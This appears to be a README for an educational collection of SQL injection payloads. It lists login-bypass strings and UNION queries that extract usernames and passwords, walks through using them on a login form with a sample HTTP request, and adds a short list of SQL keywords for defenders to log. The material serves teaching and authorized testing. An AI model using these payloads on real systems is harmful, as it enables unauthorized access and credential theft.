# SQL Injection Vulnerable Payloads
## Overview
This repository contains a collection of commonly used SQL Injection payloads intended for educational and testing purposes. These payloads demonstrate how attackers may exploit poorly secured login forms or input fields in web applications to gain unauthorized access or retrieve sensitive data from a database.
SQL Injection (SQLi) occurs when unvalidated user input is embedded directly into SQL queries. This can allow attackers to manipulate the query structure, extract data, bypass login mechanisms, or even perform destructive operations like deleting tables.
> *Note:* All payloads and usage examples in this document are to be used *only in controlled environments or with explicit permission* from the system owner.
---
## What Is SQL Injection?
SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It can be used to:
- Bypass authentication
- Retrieve hidden or unauthorized data
- Modify or delete database content
- Execute administrative operations
---
## Common SQL Injection Payloads
These payloads can be inserted into vulnerable input fields such as:
- *Login forms* (e.g., username or password fields)
- *Search boxes*
- *URL query parameters*
- *HTTP headers (User-Agent, Referer)*
### Authentication Bypass Payloads
```sql
' OR '1'='1
' OR 1=1--
admin' --
admin' # 
' OR 'a'='a
### Data extraction payloads
' UNION SELECT null, version()--
' UNION SELECT username, password FROM users--
' AND (SELECT SUBSTRING(@@version, 1, 1)) = '5'
How to Use These Payloads
1. Locate a Vulnerable Input Field:
Example: A login form that does not sanitize input.
2. Insert Payload:
In the Username field: admin' --
In the Password field: (leave blank or use dummy data)
3. Observe Behavior:
If authentication is bypassed, or unexpected database errors occur, the application may be vulnerable to SQLi.
4. Use Proxy Tools (Optional):
Tools like Burp Suite, OWASP ZAP, or Postman can help you intercept and modify HTTP requests to test payloads more precisely.
Sample HTTP Request with Payload
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded
username=admin'--&password=anything
---
Logging and Detection (Optional for Defenders)
If you're building a detection or logging system, log inputs that contain:
SQL operators: ', ", --, ;, OR, AND, UNION, etc.
Keywords like SELECT, INSERT, DROP, UPDATE, etc.
Example log entry:
[2025-05-24 14:10:00] Suspicious input detected: username=admin'-- from IP 192.168.1.15
---
Disclaimer
This content is provided for educational and ethical hacking purposes only. Use these techniques only in authorized environments such as test labs, CTFs, or penetration testing assignments with proper consent. Misuse of these payloads may be illegal and unethical.
---
License
This repository is open-source under the MIT License.
